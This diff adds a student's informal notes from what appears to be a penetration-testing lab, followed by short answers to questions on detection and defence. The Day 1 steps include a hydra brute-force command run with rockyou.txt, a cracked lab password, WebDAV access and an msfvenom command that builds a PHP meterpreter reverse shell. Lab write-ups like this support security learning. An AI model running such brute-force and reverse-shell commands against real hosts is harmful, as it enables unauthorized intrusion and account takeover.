@@ -1,0 +1,24 @@
+DAY 1	
+step one:nmap 192.168.1.0
+ results: 22/tcp ssh. 80/tcp open http
+
+step two: got to web browser and type 192.168.1.105 they left port 80 open
+
+step three: locate the rockyou.txt.gz by going to google and looking it up cd /usr/share/wordlists
+
+step four: hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder is what we used to brute force the attack. after a bit, we see ashton password is leopoldo
+
+step five: google how webdav and spend 10 min to realize we already had the file manager thing on kali, click browse network, in the URL type dav://192.168.1.105/webdav
+
+step six:run a reverse php shell payload https://docs.j7k6.org/php-reverse-shell-metasploit/ was a good site
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<$LOCAL_IP> LPORT=<$LOCAL_PORT> >> notasecretshell.php
+
+DAY 2
+question 2 part 3: an alarm that will detect when non authorized ips, try to access prohibited directorys/files 
+part 4 if they need to remain then make a short list of ips, that can access it without setting to many alarms
+
+question 3 part 4: set a 5 401 unathoirzed response limit from ip addresses. after the limit has been reached they have a 1 hour ban (IP) and if it happens again in a 24 hour period it turns to a 4 hour ban (new ban restarts the 24 hour period) 
+
+queston 4 part 2: webdav/shell.php and password.dav
+part 3: anytime this directory is be accessed by a unathourized ip/machine an alarm is set off
+part 4: set the firewall up or dont allow access through the web.
